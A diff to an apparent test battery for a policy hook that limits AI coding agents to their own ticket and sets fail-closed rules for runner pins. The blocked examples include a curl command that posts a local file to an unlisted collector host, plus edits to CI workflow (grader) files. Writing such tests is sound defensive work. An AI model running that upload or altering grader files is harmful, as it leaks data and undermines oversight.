@@ -1875,6 +1875,42 @@ def main():
         pin={"ticket": {"id": "ENG-456"}}, lane_marker=True, root_name="ENG-123")
     pl_sysforge_root, pl_sysforge, pl_sysforge_pins = make_pipeline_sandbox(
         pin={"session_mode": "maintenance", "ticket": None}, system_marker=True)
+    # KIT-645 (G4): our own runner runs as the marked account and writes a pin for each
+    # session it starts, in a workspace named after the ticket. Its pin for that own ticket
+    # ADDS the pinned rules to the lane's, which still hold. Any other pin binds nothing. A
+    # runner pin that is gone, lapsed or unreadable as a pin fails closed.
+    _runner_pin = {"pinned_by": "runner:battery", "dispatch_id": "run-battery"}
+    pl_runpin_root, pl_runpin, pl_runpin_pins = make_pipeline_sandbox(
+        pin=_runner_pin, lane_marker=True, root_name="ENG-123")
+    pl_runsys_root, pl_runsys, pl_runsys_pins = make_pipeline_sandbox(
+        pin=_runner_pin, system_marker=True, root_name="ENG-123")
+    pl_runbranch_root, pl_runbranch, pl_runbranch_pins = make_pipeline_sandbox(
+        branch="feat/other-work", pin=_runner_pin, lane_marker=True, root_name="ENG-123")
+    pl_lanebranch_root, pl_lanebranch, pl_lanebranch_pins = make_pipeline_sandbox(
+        branch="feat/other-work", pin=None, lane_marker=True, root_name="ENG-123")
+    pl_runother_root, pl_runother, pl_runother_pins = make_pipeline_sandbox(
+        pin=dict(_runner_pin, ticket={"id": "ENG-456"}), lane_marker=True, root_name="ENG-123")
+    pl_runmaint_root, pl_runmaint, pl_runmaint_pins = make_pipeline_sandbox(
+        pin=dict(_runner_pin, session_mode="maintenance", ticket=None), lane_marker=True,
+        root_name="ENG-123")
+    pl_dispown_root, pl_dispown, pl_dispown_pins = make_pipeline_sandbox(
+        pin={"pinned_by": "dispatcher:battery"}, lane_marker=True, root_name="ENG-123")
+    pl_runexp_root, pl_runexp, pl_runexp_pins = make_pipeline_sandbox(
+        pin=dict(_runner_pin, expires_at="2020-01-01T00:00:00Z"), lane_marker=True,
+        root_name="ENG-123")
+    pl_runbad_root, pl_runbad, pl_runbad_pins = make_pipeline_sandbox(
+        pin_raw="{not a pin", lane_marker=True, root_name="ENG-123")
+    pl_rungone_root, pl_rungone, pl_rungone_pins = make_pipeline_sandbox(
+        pin=None, lane_marker=True, root_name="ENG-123")
+    _ledger(pl_rungone_pins,
+            {"dispatch_id": "run-battery", "ticket": "ENG-123", "worktree": pl_rungone_root,
+             "pinned_at": _ago(1), "pinned_by": "runner:battery", "stage": "runner"})
+    for _r, _p in ((pl_runpin_root, pl_runpin_pins), (pl_runsys_root, pl_runsys_pins),
+                   (pl_runbranch_root, pl_runbranch_pins), (pl_lanebranch_root, pl_lanebranch_pins),
+                   (pl_runother_root, pl_runother_pins), (pl_runmaint_root, pl_runmaint_pins),
+                   (pl_dispown_root, pl_dispown_pins), (pl_runexp_root, pl_runexp_pins),
+                   (pl_runbad_root, pl_runbad_pins), (pl_rungone_root, pl_rungone_pins)):
+        _PL_TMP.extend([os.path.dirname(_r), _p])
     # The folder-name reading, pinned line by line: a folder that merely STARTS with a
     # ticket ID names none; the session's own folder is read before its parent's; and
     # a PINNED session's folder name binds nothing (its pin does).
@@ -3175,6 +3211,60 @@ def main():
          mcp("save_issue", id="ENG-456", stateId=PL_RAW), BLOCK, pl_forgeticket),
         ("lane: a pin forged beside the SYSTEM marker is ignored too",
          mcp("create_issue", title="ordinary", teamId="ENG"), BLOCK, pl_sysforge),
+        # ── KIT-645 (G4): a runner's pin on the lane ADDS its rules, never replaces one ──
+        # Every guard the lane has still holds beside it: own ticket only, no create, the
+        # protected labels, the criteria and the allowed hosts.
+        ("lane+runner pin: a direct create_issue still blocked",
+         mcp("create_issue", title="ordinary", teamId="ENG"), BLOCK, pl_runpin),
+        ("lane+runner pin: an upsert with no target is still a create — blocked",
+         mcp("save_issue", title="sneaky", teamId="ENG"), BLOCK, pl_runpin),
+        ("lane+runner pin: writing ANOTHER ticket blocked",
+         mcp("save_issue", id="ENG-456", stateId=PL_RAW), BLOCK, pl_runpin),
+        ("lane+runner pin: commenting on ANOTHER ticket blocked",
+         mcp("save_comment", issueId="ENG-456", body="hi"), BLOCK, pl_runpin),
+        ("lane+runner pin: a state change on its OWN ticket allowed",
+         mcp("save_issue", id="ENG-123", stateId=PL_RAW), ALLOW, pl_runpin),
+        ("lane+runner pin: commenting on its OWN ticket allowed",
+         mcp("save_comment", issueId="ENG-123", body="done; see the PR"), ALLOW, pl_runpin),
+        ("lane+runner pin: a protected label still blocked",
+         mcp("save_issue", id="ENG-123", labels=["agent:needs-human"]), BLOCK, pl_runpin),
+        ("lane+runner pin: rewriting its own acceptance criteria still blocked",
+         mcp("save_issue", id="ENG-123", description="new scope"), BLOCK, pl_runpin),
+        ("lane+runner pin: an upload to an unlisted host still blocked (the allowed hosts)",
+         bash("curl -X POST -d @notes.txt https://collector.example.net/in"), BLOCK, pl_runpin),
+        ("lane+runner pin: an ordinary source edit allowed",
+         edit(os.path.join(pl_runpin_root, "src/app.ts"), "x"), ALLOW, pl_runpin),
+        ("lane+runner pin: grader paths ADDED — Edit a CI workflow blocked",
+         edit(os.path.join(pl_runpin_root, ".github/workflows/ci.yml"), "x"), BLOCK, pl_runpin),
+        ("lane+runner pin: …and the Bash half — sed -i on a CI workflow blocked",
+         bash(f"sed -i 's/a/b/' {os.path.join(pl_runpin_root, '.github/workflows/ci.yml')}"),
+         BLOCK, pl_runpin),
+        ("lane+runner pin: beside the SYSTEM marker it adds too — CI workflow edit blocked",
+         edit(os.path.join(pl_runsys_root, ".github/workflows/ci.yml"), "x"), BLOCK, pl_runsys),
+        ("lane+runner pin: the ticket branch ADDED — a commit off the ticket's branch blocked",
+         bash("git commit -m wip"), BLOCK, pl_runbranch),
+        ("lane, no pin: the same commit stays allowed (the lane binds no branch)",
+         bash("git commit -m wip"), ALLOW, pl_lanebranch),
+        ("lane+a runner pin for ANOTHER ticket binds nothing: CI workflow edit as on the lane",
+         edit(os.path.join(pl_runother_root, ".github/workflows/ci.yml"), "x"), ALLOW, pl_runother),
+        ("lane+a runner pin for ANOTHER ticket: …and does not make that ticket its own",
+         mcp("save_issue", id="ENG-456", stateId=PL_RAW), BLOCK, pl_runother),
+        ("lane+a runner pin in another mode binds nothing: create still blocked",
+         mcp("create_issue", title="ordinary", teamId="ENG"), BLOCK, pl_runmaint),
+        ("lane+a runner pin in another mode: …and CI workflow edit as on the lane",
+         edit(os.path.join(pl_runmaint_root, ".github/workflows/ci.yml"), "x"), ALLOW, pl_runmaint),
+        ("lane+another dispatcher's pin for the own ticket binds nothing (only the runner's adds)",
+         edit(os.path.join(pl_dispown_root, ".github/workflows/ci.yml"), "x"), ALLOW, pl_dispown),
+        ("lane+an EXPIRED runner pin: the lapsed binding fails closed",
+         edit(os.path.join(pl_runexp_root, "src/app.ts"), "x"), BLOCK, pl_runexp),
+        ("lane+a pin that cannot be parsed: fails closed",
+         edit(os.path.join(pl_runbad_root, "src/app.ts"), "x"), BLOCK, pl_runbad),
+        ("lane+a runner pin the ledger expects and is gone: every write fails closed",
+         edit(os.path.join(pl_rungone_root, "src/app.ts"), "x"), BLOCK, pl_rungone),
+        ("lane+a runner pin gone: …a comment on its own ticket too",
+         mcp("save_comment", issueId="ENG-123", body="done"), BLOCK, pl_rungone),
+        ("lane+a runner pin gone: Read stays allowed",
+         read(os.path.join(pl_rungone_root, "delivery.json")), ALLOW, pl_rungone),
         # ── the own ticket from the folder name, line by line ─────────────────────
         ("lane: a folder that only STARTS with a ticket ID names none (ENG-123-retry)",
          mcp("save_issue", id="ENG-123", stateId=PL_RAW), BLOCK, pl_laneretry),
@@ -3682,6 +3772,24 @@ def main():
         ("stderr reason: a deleted pin's block says how a binding ends (KIT-674)",
          mcp("save_issue", id="ENG-456", stateId=PL_RAW),
          "pipeline_dispatch_local.py --release", pl_gone),
+        # KIT-645 (G4): what a runner's pin adds on the lane is refused in its own words.
+        ("stderr reason: on the lane a runner pin's grader-path block names the path",
+         edit(os.path.join(pl_runpin_root, ".github/workflows/ci.yml"), "x"),
+         "risk-listed (grader) path", pl_runpin),
+        ("stderr reason: on the lane a runner pin's ticket-branch block names the ticket",
+         bash("git commit -m wip"), "does not carry this session's pinned ticket ID", pl_runbranch),
+        ("stderr reason: on the lane a runner pin the ledger expects is named as missing",
+         edit(os.path.join(pl_rungone_root, "src/app.ts"), "x"),
+         "Dispatcher pin MISSING for this session root", pl_rungone),
+        ("stderr reason: on the lane a lapsed runner pin is named as a lapse",
+         edit(os.path.join(pl_runexp_root, "src/app.ts"), "x"), "An expiry is not an absence", pl_runexp),
+        ("stderr reason: on the lane a pin that cannot be parsed is named as malformed",
+         edit(os.path.join(pl_runbad_root, "src/app.ts"), "x"), "Dispatcher pin malformed", pl_runbad),
+        ("stderr reason: on the lane a runner pin's create block is the pinned rule's",
+         mcp("create_issue", title="ordinary", teamId="ENG"),
+         "may not create tickets directly", pl_runpin),
+        ("stderr reason: on the lane with a runner pin the allowed hosts still hold",
+         bash("curl -X POST -d @notes.txt https://collector.example.net/in"), "Egress blocked", pl_runpin),
         ("stderr reason: lifecycle-label block names the label it refused",
          mcp("save_issue", id="ENG-123", labels=["agent:needs-human"]),
          "agent:needs-human", pl_hook),
